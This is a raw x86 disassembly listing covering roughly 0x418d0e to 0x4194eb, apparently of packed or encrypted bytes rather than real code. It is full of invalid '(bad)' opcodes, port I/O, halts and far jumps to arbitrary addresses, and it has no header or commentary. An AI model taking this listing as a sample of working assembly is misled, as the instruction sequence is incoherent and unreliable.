  418d0e:	sub    dh,al
  418d10:	repnz xchg ebx,eax
  418d12:	push   ebp
  418d13:	lea    edi,[ebp-0x25]
  418d16:	xchg   esp,eax
  418d17:	mov    cs,WORD PTR [ecx-0x64]
  418d1a:	sub    eax,0x6e1c234c
  418d1f:	and    al,0x92
  418d21:	add    al,0x47
  418d23:	jnp    0x418d17
  418d25:	pop    ecx
  418d26:	adc    ecx,DWORD PTR [eax]
  418d28:	pushf  
  418d29:	mov    ecx,esi
  418d2b:	cdq    
  418d2c:	push   es
  418d2d:	aad    0xd
  418d2f:	cmp    esi,DWORD PTR [ebp+0x2f]
  418d32:	jnp    0x418cb9
  418d34:	les    esp,FWORD PTR [esi]
  418d36:	pop    edi
  418d37:	leave  
  418d38:	pushf  
  418d39:	mov    es,edi
  418d3b:	add    eax,0xc2d7844d
  418d40:	xchg   BYTE PTR [ebp+esi*1-0x6f],ah
  418d44:	xor    BYTE PTR ds:0xee2318b1,0x17
  418d4b:	sub    al,0x69
  418d4d:	jno    0x418db5
  418d4f:	mov    WORD PTR [eax+0x40],gs
  418d52:	(bad)  
  418d53:	jmp    0x418db5
  418d55:	mov    ds:0x1302686e,al
  418d5a:	ins    DWORD PTR es:[edi],dx
  418d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d5c:	hlt    
  418d5d:	mov    esi,esp
  418d5f:	hlt    
  418d60:	clc    
  418d61:	adc    dl,BYTE PTR [ecx]
  418d63:	push   edx
  418d64:	cld    
  418d65:	add    bh,ah
  418d67:	xchg   edi,eax
  418d68:	stc    
  418d69:	les    ecx,FWORD PTR [ecx+0x31773955]
  418d6f:	cmp    BYTE PTR [edx+ebx*1+0x66],bl
  418d73:	repnz cmp al,0xd0
  418d76:	pop    eax
  418d77:	pop    edi
  418d78:	pop    ds
  418d79:	(bad)  
  418d7a:	mov    ds:0xc0c0d8b2,al
  418d7f:	clc    
  418d80:	dec    esi
  418d81:	xchg   ebp,eax
  418d82:	call   0x8f7f:0x86c9e488
  418d89:	adc    DWORD PTR [ebx+0x3f0a3395],edi
  418d8f:	lea    edx,[eax]
  418d91:	pop    ebx
  418d92:	sbb    al,0x93
  418d94:	xlat   BYTE PTR ds:[ebx]
  418d95:	les    esp,FWORD PTR [ebx+0x16]
  418d98:	add    al,0x1b
  418d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d9b:	mov    dh,0x7
  418d9d:	mov    ds:0xdd6fb148,al
  418da2:	or     al,0x2d
  418da4:	xor    al,0xe0
  418da6:	cmc    
  418da7:	leave  
  418da8:	in     al,dx
  418da9:	fisttp WORD PTR [esi]
  418dab:	mov    ecx,0xdd64147f
  418db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418db1:	cmp    ecx,ebx
  418db3:	stc    
  418db4:	sub    al,0xb8
  418db6:	add    dh,al
  418db8:	mov    dh,0xe5
  418dba:	add    bl,BYTE PTR [esi-0x6f2166b7]
  418dc0:	inc    ecx
  418dc1:	or     edi,DWORD PTR [ecx+0xfc5c7b5]
  418dc7:	add    eax,0xb83c2576
  418dcc:	cld    
  418dcd:	scas   al,BYTE PTR es:[edi]
  418dce:	iret   
  418dcf:	push   0xffffffbd
  418dd1:	out    0x2d,al
  418dd3:	adc    cl,cl
  418dd5:	in     al,dx
  418dd6:	les    ecx,FWORD PTR [ebx-0x2a]
  418dd9:	push   edx
  418dda:	or     esp,DWORD PTR [esi-0x4c]
  418ddd:	adc    BYTE PTR [edi],bl
  418ddf:	add    al,0xc1
  418de1:	rcr    BYTE PTR [ebx+0x284f57d2],1
  418de7:	repz dec edx
  418de9:	pop    esi
  418dea:	in     eax,0xe8
  418dec:	sahf   
  418ded:	mov    edi,0xd0bd1970
  418df2:	shl    DWORD PTR [edx+0x3c],cl
  418df5:	lea    esi,[ecx+0xf]
  418df8:	add    eax,0x56b54f88
  418dfd:	nop
  418dfe:	sbb    al,0xef
  418e00:	jbe    0x418e37
  418e02:	mov    ah,0x8f
  418e04:	retf   
  418e05:	(bad)  
  418e06:	loop   0x418e7b
  418e08:	jne    0x418e51
  418e0a:	fldenv [esi]
  418e0c:	and    esi,ecx
  418e0e:	test   eax,0x8766d795
  418e13:	mov    cl,0x34
  418e15:	(bad)  
  418e16:	mov    cl,0x9a
  418e18:	lods   al,BYTE PTR ds:[esi]
  418e19:	stos   BYTE PTR es:[edi],al
  418e1a:	sub    BYTE PTR [eax-0xde33d64],dh
  418e20:	cdq    
  418e21:	inc    edx
  418e22:	jo     0x418e5b
  418e24:	call   DWORD PTR [edx]
  418e26:	and    DWORD PTR [ecx],ebx
  418e28:	cs push cs
  418e2a:	xchg   BYTE PTR [ecx],dl
  418e2c:	cwde   
  418e2d:	push   0x938272e5
  418e32:	lahf   
  418e33:	dec    esp
  418e34:	mov    eax,ds:0x377140f3
  418e39:	stos   DWORD PTR es:[edi],eax
  418e3a:	aad    0xd8
  418e3c:	push   eax
  418e3d:	mov    edx,0x62caa0dd
  418e42:	inc    eax
  418e43:	popf   
  418e44:	sub    DWORD PTR [ebp-0x14],ecx
  418e47:	xchg   DWORD PTR [edi+0x5f384fc9],ebp
  418e4d:	mov    ebx,0xdf5f8aa5
  418e52:	xchg   DWORD PTR [ebx+edi*4],esp
  418e55:	push   edx
  418e56:	sub    eax,0x7e792ca8
  418e5b:	adc    ebx,edx
  418e5d:	mov    bh,0x84
  418e5f:	and    eax,0x82f1d34f
  418e64:	lods   eax,DWORD PTR ds:[esi]
  418e65:	das    
  418e66:	mov    ds:0xcded3644,al
  418e6b:	ins    DWORD PTR es:[edi],dx
  418e6c:	ja     0x418ea2
  418e6e:	pop    esp
  418e6f:	cmp    al,BYTE PTR [edx+0x4d8282e2]
  418e75:	mov    fs,WORD PTR [esi]
  418e77:	xchg   esp,eax
  418e78:	in     al,dx
  418e79:	jge    0x418ee6
  418e7b:	shl    BYTE PTR [esi+0x65],1
  418e7e:	repz xchg edx,ecx
  418e81:	xor    eax,0x6db4b99d
  418e86:	sub    edi,eax
  418e88:	sbb    al,0xf1
  418e8a:	add    edx,edi
  418e8c:	aam    0xf2
  418e8e:	fcom   DWORD PTR [eax+0x9]
  418e91:	test   DWORD PTR [eax-0xabea8ae],edx
  418e97:	jo     0x418ed3
  418e99:	sbb    edi,esi
  418e9b:	lods   eax,DWORD PTR ds:[esi]
  418e9c:	pop    ebx
  418e9d:	and    edx,edi
  418e9f:	hlt    
  418ea0:	cmp    bl,BYTE PTR [edx]
  418ea2:	aam    0x58
  418ea4:	adc    al,0x8d
  418ea6:	cmp    BYTE PTR [ebp-0x1397f561],bh
  418eac:	mov    ebp,0xa5906395
  418eb1:	leave  
  418eb2:	fcmovb st,st(6)
  418eb4:	leave  
  418eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eb6:	mov    al,0xb1
  418eb8:	es mov eax,0x5ea8e5af
  418ebe:	jb     0x418f28
  418ec0:	pop    ebp
  418ec1:	jnp    0x418edb
  418ec3:	and    al,BYTE PTR [esi-0x73b87311]
  418ec9:	and    DWORD PTR [ecx-0x4b],eax
  418ecc:	jnp    0x418eb2
  418ece:	sbb    DWORD PTR [edx+0x33],ebp
  418ed1:	frstor [eax]
  418ed3:	and    BYTE PTR [esi+0x6037169b],0xc5
  418eda:	out    0x1a,eax
  418edc:	fwait
  418edd:	shl    BYTE PTR [ebp-0x48],cl
  418ee0:	fld    TBYTE PTR [edx-0x32]
  418ee3:	mov    cl,0x5
  418ee5:	xor    edx,DWORD PTR [ebx-0x4473054a]
  418eeb:	repnz cwde 
  418eed:	out    0x3b,al
  418eef:	inc    ecx
  418ef0:	fwait
  418ef1:	add    esp,DWORD PTR [ebp+0x3e]
  418ef4:	out    dx,al
  418ef5:	test   BYTE PTR [eax+0x5e],dl
  418ef8:	or     ebp,edi
  418efa:	xor    DWORD PTR [ebx-0x1dd27086],ecx
  418f00:	repnz test eax,0xcd957fb7
  418f06:	(bad)  
  418f07:	gs aad 0xa4
  418f0a:	and    eax,0x292e4a3f
  418f0f:	push   cs
  418f10:	or     al,0xcf
  418f12:	push   ss
  418f13:	mov    ah,0xda
  418f15:	or     BYTE PTR [edx+0x7f],dl
  418f18:	cdq    
  418f19:	mov    dh,0xb7
  418f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f1c:	or     al,0x9a
  418f1e:	call   0x1bae:0x459eab70
  418f25:	fimul  WORD PTR [edx+0x569871ee]
  418f2b:	dec    ebx
  418f2c:	dec    edx
  418f2d:	stc    
  418f2e:	loope  0x418ef9
  418f30:	mov    eax,ds:0xc91600ac
  418f35:	mov    dl,0x85
  418f37:	xchg   edi,eax
  418f38:	adc    dl,BYTE PTR [ebx-0x1e6c74f1]
  418f3e:	int3   
  418f3f:	addr16 add eax,0x1e9b4792
  418f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f46:	pop    ebx
  418f47:	fwait
  418f48:	aam    0xd6
  418f4a:	inc    ecx
  418f4b:	cmp    eax,0x65f59c74
  418f50:	and    eax,0xd927f7ce
  418f55:	mov    esi,0x62b9bb0e
  418f5a:	repz cmp eax,0xdf56fbee
  418f60:	mov    eax,0x9fbf9000
  418f65:	mov    ds:0x95ebd9d9,eax
  418f6a:	fsub   st,st(0)
  418f6c:	mov    cl,0xe
  418f6e:	fldcw  WORD PTR [edi-0x66]
  418f71:	aaa    
  418f72:	and    ch,BYTE PTR ds:0xa2f9266d
  418f78:	dec    ebp
  418f79:	cli    
  418f7a:	sbb    BYTE PTR [eax-0x11],bh
  418f7d:	pusha  
  418f7e:	in     al,0x84
  418f80:	cmp    dh,bh
  418f82:	jmp    0x827:0xae29b2f4
  418f89:	jp     0x418ff0
  418f8b:	leave  
  418f8c:	out    dx,al
  418f8d:	and    esp,DWORD PTR ds:0x2b6c87b1
  418f93:	je     0x418fb6
  418f95:	mov    ebx,0x6d0bd650
  418f9a:	fcom   DWORD PTR [ecx]
  418f9c:	inc    eax
  418f9d:	dec    edi
  418f9e:	enter  0x38ee,0x9e
  418fa2:	xor    edi,esi
  418fa4:	or     edx,DWORD PTR [edx+0x5a]
  418fa7:	push   0x11
  418fa9:	lods   al,BYTE PTR es:[esi]
  418fab:	test   DWORD PTR [ecx-0x11],eax
  418fae:	out    0xb7,al
  418fb0:	mov    ds:0x170b76d6,al
  418fb5:	mov    ch,0x24
  418fb7:	inc    esp
  418fb8:	aad    0x6c
  418fba:	retf   
  418fbb:	push   edx
  418fbc:	add    al,BYTE PTR ds:0xecb0c7d5
  418fc2:	fidiv  DWORD PTR [ebx+0x5cbfef41]
  418fc8:	push   ds
  418fc9:	push   esp
  418fca:	(bad)  
  418fcb:	out    dx,eax
  418fcc:	cdq    
  418fcd:	call   0xc0223a7a
  418fd2:	fld    TBYTE PTR [edx-0x1]
  418fd5:	adc    dh,BYTE PTR [esi]
  418fd7:	outs   dx,BYTE PTR ds:[esi]
  418fd8:	out    dx,eax
  418fd9:	sub    eax,0x2c6f80ec
  418fde:	or     eax,0x590a6628
  418fe3:	add    al,0x57
  418fe5:	fisttp QWORD PTR [esi]
  418fe7:	dec    edx
  418fe8:	or     edi,DWORD PTR [eax-0x4]
  418feb:	xchg   esp,eax
  418fec:	adc    BYTE PTR [edi+0x4a92b59b],dl
  418ff2:	adc    BYTE PTR [edi+eax*4],0x72
  418ff6:	sub    ch,BYTE PTR [ecx]
  418ff8:	adc    DWORD PTR [ebx],ebp
  418ffa:	mov    cl,0x85
  418ffc:	jp     0x418fe9
  418ffe:	mov    esi,0x4ddc44d
  419003:	pop    esp
  419004:	ret    0xe748
  419007:	pop    es
  419008:	pushf  
  419009:	cli    
  41900a:	jb     0x41903d
  41900c:	mov    bl,0xb2
  41900e:	mov    WORD PTR [ecx],?
  419010:	inc    esi
  419011:	xlat   BYTE PTR ds:[ebx]
  419012:	out    0xaa,eax
  419014:	(bad)  
  419015:	imul   esp,DWORD PTR [ebx+0x54fa5150],0x2d
  41901c:	jns    0x418fd2
  41901e:	inc    edi
  41901f:	inc    ebp
  419020:	ins    DWORD PTR es:[edi],dx
  419021:	fidiv  DWORD PTR [edi]
  419023:	popf   
  419024:	xor    BYTE PTR [edi+0x17],0xcf
  419028:	stos   DWORD PTR es:[edi],eax
  419029:	popf   
  41902a:	scas   eax,DWORD PTR es:[edi]
  41902b:	icebp  
  41902c:	mov    edx,0x56b282e9
  419031:	jle    0x418ff9
  419033:	fistp  QWORD PTR [edx]
  419035:	cwde   
  419036:	cld    
  419037:	or     ebp,0x1496b9cf
  41903d:	add    DWORD PTR [esi+ebp*1+0x7d],edx
  419041:	cwde   
  419042:	dec    ebx
  419043:	loop   0x419083
  419045:	add    eax,0xf1d82fc2
  41904a:	mov    ?,WORD PTR [edi]
  41904c:	in     al,dx
  41904d:	push   ebp
  41904e:	sub    ecx,esp
  419050:	add    DWORD PTR [ebx],ebx
  419052:	or     ebx,esi
  419054:	fs pop edx
  419056:	(bad)  
  419057:	hlt    
  419058:	add    edx,DWORD PTR [esi+ebp*4+0x2c]
  41905c:	mov    ebx,0x2ac625e7
  419061:	ss jbe 0x41909a
  419064:	icebp  
  419065:	fmulp  st(0),st
  419067:	pop    ebx
  419068:	js     0x418ff2
  41906a:	mov    eax,ds:0x8e049e84
  41906f:	pop    esi
  419070:	lock leave 
  419072:	arpl   WORD PTR [esi+ebx*4],ax
  419075:	(bad)  
  419076:	sbb    edx,esp
  419078:	loope  0x4190de
  41907a:	cmp    ecx,DWORD PTR [ebx-0x4b47d04f]
  419080:	jnp    0x4190f1
  419082:	xchg   esi,eax
  419083:	out    dx,eax
  419084:	nop
  419085:	ins    DWORD PTR es:[edi],dx
  419086:	cmp    ch,bl
  419088:	fadd   QWORD PTR [ebx+0x7c]
  41908b:	jl     0x41902c
  41908d:	mov    edi,DWORD PTR [ebp+0x7a]
  419090:	mov    bl,0x54
  419092:	ins    BYTE PTR es:[edi],dx
  419093:	sahf   
  419094:	pop    ebp
  419095:	test   DWORD PTR [edi],ebp
  419097:	ret    0xa180
  41909a:	xchg   ebx,eax
  41909b:	mov    ds:0xba1b48d3,eax
  4190a0:	jmp    0x9528fd8f
  4190a5:	fwait
  4190a6:	mov    edi,0x6cd24394
  4190ab:	xchg   ebp,eax
  4190ac:	mov    al,0x5e
  4190ae:	test   DWORD PTR [eax-0x4e],0xc954b513
  4190b5:	mov    al,0xb1
  4190b7:	mov    eax,0x1effa330
  4190bc:	mov    eax,0x73ccfa9c
  4190c1:	sub    BYTE PTR [edx],ah
  4190c3:	dec    ebx
  4190c4:	pop    ecx
  4190c5:	(bad)  
  4190c6:	in     eax,dx
  4190c7:	xchg   esi,eax
  4190c8:	aad    0x4c
  4190ca:	iret   
  4190cb:	(bad)  
  4190cc:	mov    ebx,0x1beb70af
  4190d1:	xchg   edi,eax
  4190d2:	mov    esp,0x884fa407
  4190d7:	or     esi,0x5b7b6802
  4190dd:	call   0x112:0x63f2de18
  4190e4:	add    al,0x61
  4190e6:	jecxz  0x4190f4
  4190e8:	push   ebx
  4190e9:	jg     0x419140
  4190eb:	nop
  4190ec:	das    
  4190ed:	mov    al,ds:0xe48389d3
  4190f2:	pop    DWORD PTR [ebx-0x6]
  4190f5:	jecxz  0x419120
  4190f7:	shr    BYTE PTR [ebp-0x33],cl
  4190fa:	pusha  
  4190fb:	lds    ebx,FWORD PTR [ebp-0x2a]
  4190fe:	add    eax,0x2625714c
  419103:	sbb    edx,DWORD PTR [edx]
  419105:	ja     0x4190c2
  419107:	mov    ebp,0x871bcaf1
  41910c:	in     eax,dx
  41910d:	cmp    cl,BYTE PTR [eax-0x1c1642e]
  419113:	xor    ecx,eax
  419115:	cwde   
  419116:	cdq    
  419117:	mov    ah,0xf
  419119:	push   es
  41911a:	xchg   ecx,eax
  41911b:	jo     0x4190f9
  41911d:	mov    gs:0x81485a,al
  419123:	and    eax,0x7537e4ee
  419128:	int    0x85
  41912a:	push   ebx
  41912b:	fs cmp cl,cl
  41912e:	sbb    al,BYTE PTR [ebp+edi*2+0x2]
  419132:	loopne 0x41913e
  419134:	pusha  
  419135:	cmp    ebx,DWORD PTR [ebx+0x64]
  419138:	loope  0x41917f
  41913a:	mov    eax,ds:0x8d9e104c
  41913f:	mov    al,ds:0x3816bb43
  419144:	adc    ecx,DWORD PTR [esi-0x59]
  419147:	repnz out 0x1f,al
  41914a:	cmp    eax,0x6eb5ecdc
  41914f:	std    
  419150:	leave  
  419151:	adc    al,0xda
  419153:	and    DWORD PTR [edx],eax
  419155:	out    0xd3,eax
  419157:	cmp    bl,BYTE PTR [edi]
  419159:	stc    
  41915a:	repnz imul ebp,DWORD PTR [ebp+0x2f18e01b],0x40cda2dc
  419165:	cli    
  419166:	(bad)  
  419167:	cld    
  419168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419169:	add    DWORD PTR [ecx-0x68e4f0ed],eax
  41916f:	dec    eax
  419170:	mov    ds:0xcf5a940e,al
  419175:	adc    DWORD PTR [eax+0x1ae092ec],0x157cf4e3
  41917f:	shl    eax,cl
  419181:	mov    ch,0x6b
  419183:	push   es
  419184:	mov    edi,0xc1602e31
  419189:	push   0x9bb88122
  41918e:	and    DWORD PTR [ebp+0x1f],0x61280bfa
  419195:	or     al,0x72
  419197:	ins    BYTE PTR es:[edi],dx
  419198:	sbb    edi,DWORD PTR [edx]
  41919a:	mov    esp,0x16112430
  41919f:	mov    WORD PTR [esi-0x4d],fs
  4191a2:	mov    ebx,0xafaa1132
  4191a7:	aam    0x34
  4191a9:	fcomp  DWORD PTR [ecx-0x6c]
  4191ac:	mov    bh,0xf8
  4191ae:	xor    cl,cl
  4191b0:	ins    BYTE PTR es:[edi],dx
  4191b1:	mov    eax,0xb29570fd
  4191b6:	test   eax,0x14f29840
  4191bb:	xchg   ecx,eax
  4191bc:	(bad)
  4191bf:	test   DWORD PTR [edi],0xd538b171
  4191c5:	dec    edx
  4191c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191c7:	mov    esi,cs
  4191c9:	cld    
  4191ca:	ret    
  4191cb:	dec    eax
  4191cc:	or     al,0xdb
  4191ce:	pushf  
  4191cf:	jae    0x41923e
  4191d1:	aaa    
  4191d2:	xor    DWORD PTR [edi+ecx*1-0x439423e0],0xffffffc2
  4191da:	loop   0x4191ee
  4191dc:	cld    
  4191dd:	jb     0x419166
  4191df:	(bad)  
  4191e0:	fld    TBYTE PTR [edi+0x28]
  4191e3:	ss and eax,0x412425ab
  4191e9:	cmc    
  4191ea:	out    dx,eax
  4191eb:	cmp    al,0x18
  4191ed:	mov    bl,0x5c
  4191ef:	ins    DWORD PTR es:[edi],dx
  4191f0:	fwait
  4191f1:	mov    eax,ds:0x1f444fd7
  4191f6:	jne    0x41923b
  4191f8:	push   ebp
  4191f9:	jb     0x4191fb
  4191fb:	into   
  4191fc:	adc    DWORD PTR ds:0x34b66413,eax
  419202:	mov    ebx,0x4c520dfb
  419207:	nop
  419208:	xor    cl,al
  41920a:	sbb    ecx,DWORD PTR [edx+0x1a]
  41920d:	out    0x88,eax
  41920f:	call   0xfad336c7
  419214:	or     DWORD PTR [ebx+0x736cc3b4],ebx
  41921a:	cmp    bh,BYTE PTR fs:[eax-0x441966d7]
  419221:	add    eax,0x39240c08
  419226:	enter  0x1940,0x21
  41922a:	cs and ebp,esi
  41922d:	or     BYTE PTR [ebx],ah
  41922f:	push   esp
  419230:	lock mov edx,0xa55905c2
  419236:	jecxz  0x419286
  419238:	and    BYTE PTR [eax+0x42],0xd5
  41923c:	sub    al,0xc4
  41923e:	in     eax,dx
  41923f:	xor    al,0xc8
  419241:	ficomp DWORD PTR [esi]
  419243:	mov    ecx,0xea035f39
  419248:	xor    BYTE PTR [esi],cl
  41924a:	test   al,0x87
  41924c:	in     eax,0x25
  41924e:	bnd ss ret 0xab85
  419253:	inc    edx
  419254:	fiadd  WORD PTR [edi]
  419256:	cld    
  419257:	sub    DWORD PTR [ecx],ecx
  419259:	xlat   BYTE PTR ds:[ebx]
  41925a:	push   es
  41925b:	popa   
  41925c:	jmp    FWORD PTR [edx+0x75]
  41925f:	adc    al,0x66
  419261:	jecxz  0x419288
  419263:	ins    BYTE PTR es:[edi],dx
  419264:	mov    edx,0x706a51c2
  419269:	jg     0x419257
  41926b:	pop    ebx
  41926c:	dec    esi
  41926d:	call   FWORD PTR [ebp-0x4]
  419270:	push   ebp
  419271:	stos   BYTE PTR es:[edi],al
  419272:	xlat   BYTE PTR ds:[ebx]
  419273:	or     ebx,eax
  419275:	mul    BYTE PTR [eax-0x51]
  419278:	js     0x4192e8
  41927a:	inc    eax
  41927b:	sti    
  41927c:	jae    0x4192f1
  41927e:	inc    ecx
  41927f:	pop    ebx
  419280:	adc    eax,0xcc4fec03
  419285:	mov    ebp,DWORD PTR [edx+ebp*4+0x74]
  419289:	mov    edx,0xc8c2c989
  41928e:	inc    ebx
  41928f:	sub    al,bh
  419291:	cmp    edi,DWORD PTR [eax]
  419293:	xchg   ebx,eax
  419294:	fwait
  419295:	div    ebp
  419297:	inc    dl
  419299:	xchg   DWORD PTR [ebx+ebx*2-0x4d],edi
  41929d:	jecxz  0x4192a8
  41929f:	scas   eax,DWORD PTR es:[edi]
  4192a0:	push   esp
  4192a1:	add    dh,bh
  4192a3:	cmc    
  4192a4:	jns    0x4192b0
  4192a6:	lahf   
  4192a7:	cmp    BYTE PTR [edi],0x13
  4192aa:	and    dh,bh
  4192ac:	inc    ecx
  4192ad:	jne    0x419262
  4192af:	repz in al,dx
  4192b1:	out    dx,eax
  4192b2:	jmp    FWORD PTR [ebx]
  4192b4:	(bad)  
  4192b5:	fdiv   QWORD PTR [edx+0x3]
  4192b8:	sub    BYTE PTR [ebp+0x37],cl
  4192bb:	pop    ds
  4192bc:	lock test eax,0x6191484e
  4192c2:	rcr    esp,cl
  4192c4:	sbb    DWORD PTR [ebx-0x57607720],0xd512ba6f
  4192ce:	mov    ?,ebp
  4192d0:	lea    eax,[ebx]
  4192d2:	sub    eax,0xa40e8fd8
  4192d7:	ror    BYTE PTR [ebp+0x369ed0ce],0x78
  4192de:	mov    eax,0xd171f3d2
  4192e3:	pop    esp
  4192e4:	and    eax,0x6ff03205
  4192e9:	mov    ebx,0x80b72396
  4192ee:	mov    bh,0xd0
  4192f0:	ror    BYTE PTR [edi+0x26cdc1e1],cl
  4192f6:	imul   edx,DWORD PTR [ebp-0x5a130b5a],0x8a013633
  419300:	inc    esp
  419301:	addr16 aaa 
  419303:	in     eax,0xc9
  419305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419306:	(bad)  
  419307:	mov    esp,0x7e1d526c
  41930c:	add    eax,edx
  41930e:	jle    0x41937e
  419310:	mov    WORD PTR [eax],es
  419312:	jne    0x41936d
  419314:	test   BYTE PTR [ecx+0x40],bh
  419317:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419319:	aam    0x59
  41931b:	in     eax,0xad
  41931d:	xchg   BYTE PTR [edi-0x51],ah
  419320:	fisub  WORD PTR [eax-0x74]
  419323:	or     dl,BYTE PTR [edi-0x5]
  419326:	dec    edi
  419327:	fdiv   DWORD PTR [eax]
  419329:	and    bh,BYTE PTR [ebp+0x9]
  41932c:	(bad)
  41932f:	adc    eax,0xb20fb670
  419334:	xchg   BYTE PTR [esi+edx*8],ah
  419337:	mov    BYTE PTR [ecx],dh
  419339:	or     al,0x85
  41933b:	lea    ebp,[ecx+0x7a]
  41933e:	data16 fist WORD PTR [ebp+0x5e0db11e]
  419345:	cmp    al,0x31
  419347:	push   ebp
  419348:	or     al,0x8d
  41934a:	xor    eax,0x23dbfbec
  41934f:	cmp    BYTE PTR [ebp-0x7c0f2e28],dh
  419355:	call   0x73c1:0x6d927ed6
  41935c:	pop    ss
  41935d:	jbe    0x419354
  41935f:	addr16 loope 0x419314
  419362:	rcl    DWORD PTR [esi+eiz*2-0x33],1
  419366:	dec    ecx
  419367:	fld    QWORD PTR [ebp+0x6d]
  41936a:	pop    ss
  41936b:	adc    ebp,DWORD PTR [edx-0x761c7b6e]
  419371:	clc    
  419372:	daa    
  419373:	dec    ecx
  419374:	fwait
  419375:	aam    0x21
  419377:	sbb    ch,BYTE PTR [edi-0x53]
  41937a:	js     0x419393
  41937c:	jp     0x419383
  41937e:	jb     0x419318
  419380:	into   
  419381:	mov    ch,0xc0
  419383:	sub    eax,0x4e384994
  419388:	inc    ebp
  419389:	pop    edx
  41938a:	xor    DWORD PTR [ebp+0x5eb9a04e],0xffffff88
  419391:	mov    esi,0x3436750b
  419396:	dec    ebx
  419397:	cwde   
  419398:	push   edi
  419399:	or     BYTE PTR [edx+0x53ae3661],dl
  41939f:	xchg   edx,eax
  4193a0:	xor    eax,0x5452fd9
  4193a5:	scas   eax,DWORD PTR es:[edi]
  4193a6:	ins    DWORD PTR es:[edi],dx
  4193a7:	mov    edx,0x4c9e1e4a
  4193ac:	nop
  4193ad:	dec    esi
  4193ae:	lock mov edx,edi
  4193b1:	xchg   esp,eax
  4193b2:	aaa    
  4193b3:	push   edi
  4193b4:	stos   BYTE PTR es:[edi],al
  4193b5:	add    al,0xda
  4193b7:	pop    ebx
  4193b8:	call   0x62f10803
  4193bd:	dec    eax
  4193be:	mov    ds,WORD PTR [ebx]
  4193c0:	push   ebx
  4193c1:	pop    DWORD PTR [ecx-0x115e17a4]
  4193c7:	xor    BYTE PTR [ebp+0xe10f46d],bh
  4193cd:	sub    edi,DWORD PTR [edi]
  4193cf:	ja     0x419430
  4193d1:	mov    dl,BYTE PTR [ecx]
  4193d3:	scas   eax,DWORD PTR es:[edi]
  4193d4:	add    DWORD PTR [ebx-0x1f],esp
  4193d7:	stos   BYTE PTR es:[edi],al
  4193d8:	sbb    esp,DWORD PTR [ecx]
  4193da:	add    al,0x81
  4193dc:	xor    dl,BYTE PTR [ebx-0x1a2460df]
  4193e2:	sub    al,0x38
  4193e4:	repnz add esp,DWORD PTR [edx+0x46]
  4193e8:	xor    DWORD PTR [eax],0xd57cfec
  4193ee:	dec    edi
  4193ef:	inc    ebx
  4193f0:	out    dx,eax
  4193f1:	mov    ds:0x4e770eeb,al
  4193f6:	lahf   
  4193f7:	dec    eax
  4193f8:	imul   esp,DWORD PTR [edx],0x7a
  4193fb:	nop
  4193fc:	mov    edi,0xd1e9e614
  419401:	scas   al,BYTE PTR es:[edi]
  419402:	mov    eax,ds:0x6de9e239
  419407:	and    eax,0x63219ae1
  41940c:	jle    0x41940d
  41940e:	outs   dx,DWORD PTR ds:[esi]
  41940f:	and    DWORD PTR [eax+0x1baad59f],esp
  419415:	xor    edi,esp
  419417:	push   0xffffff80
  419419:	lahf   
  41941a:	sub    DWORD PTR [ecx+0x7e],ebp
  41941d:	mov    edi,0x8c1bef8a
  419422:	jl     0x419455
  419424:	bound  esp,QWORD PTR [ebx-0x4f]
  419427:	inc    esp
  419428:	mov    dh,BYTE PTR [edx]
  41942a:	mov    ?,ebx
  41942c:	clc    
  41942d:	jmp    0x19702c98
  419432:	leave  
  419433:	push   es
  419434:	sbb    BYTE PTR [esi],cl
  419436:	pop    ss
  419437:	and    ah,dl
  419439:	fwait
  41943a:	or     ebp,DWORD PTR [eax-0x2d]
  41943d:	fs and eax,0x944e40ca
  419443:	pop    ecx
  419444:	(bad)  
  419445:	aaa    
  419446:	add    BYTE PTR ds:0xa6488d66,bl
  41944c:	ror    BYTE PTR [edx-0x8],1
  41944f:	popa   
  419450:	dec    edi
  419451:	mov    edi,DWORD PTR [esi+edx*8-0x5d]
  419455:	push   cs
  419456:	jecxz  0x4194c9
  419458:	retf   0xccb4
  41945b:	mov    esp,0xab16c438
  419460:	fisub  WORD PTR cs:[edx]
  419463:	mov    esp,0xe3918e51
  419468:	addr16 call 0x34c6:0xca2d85e2
  419470:	daa    
  419471:	sbb    edx,DWORD PTR [eax-0x10]
  419474:	adc    eax,0x753c61f8
  419479:	and    DWORD PTR [ebx],esi
  41947b:	dec    eax
  41947c:	les    ecx,FWORD PTR [edi-0x3f]
  41947f:	retf   
  419480:	pop    esi
  419481:	mov    ds:0x321b0734,al
  419486:	mov    dl,BYTE PTR [ecx]
  419488:	fdiv   DWORD PTR [edx]
  41948a:	pop    ecx
  41948b:	(bad)  
  41948c:	push   ebp
  41948d:	inc    esi
  41948e:	add    esp,DWORD PTR [ecx+0x26d2d5e7]
  419494:	mov    eax,ds:0xa00af0de
  419499:	mov    WORD PTR [eax+edx*2-0x39099bfb],ds
  4194a0:	push   eax
  4194a1:	cmp    cl,al
  4194a3:	popf   
  4194a4:	push   esi
  4194a5:	push   es
  4194a6:	pop    edx
  4194a7:	dec    edx
  4194a8:	clc    
  4194a9:	push   ecx
  4194aa:	test   BYTE PTR [ebx],cl
  4194ac:	cmp    bl,ah
  4194ae:	loopne 0x41952d
  4194b0:	jmp    0x8a02:0x4cdc238d
  4194b7:	test   DWORD PTR [ecx+0x6813b794],esi
  4194bd:	out    0x6e,al
  4194bf:	inc    esp
  4194c0:	jp     0x419531
  4194c2:	mov    ch,ch
  4194c4:	xchg   ebx,eax
  4194c5:	mov    ebx,0x125e3494
  4194ca:	clc    
  4194cb:	cmp    al,0xb0
  4194cd:	ficomp WORD PTR [ebx]
  4194cf:	xlat   BYTE PTR ds:[ebx]
  4194d0:	int    0xfd
  4194d2:	add    dl,BYTE PTR cs:[edi-0x54e8cda]
  4194d9:	mov    DWORD PTR [edi+edi*2],ecx
  4194dc:	aad    0x5b
  4194de:	push   esi
  4194df:	jl     0x419516
  4194e1:	sbb    al,0xe6
  4194e3:	out    0x75,al
  4194e5:	cs jecxz 0x419564
  4194e8:	inc    ecx
  4194e9:	mov    bl,0x2a
  4194eb:	jns    0x41950a
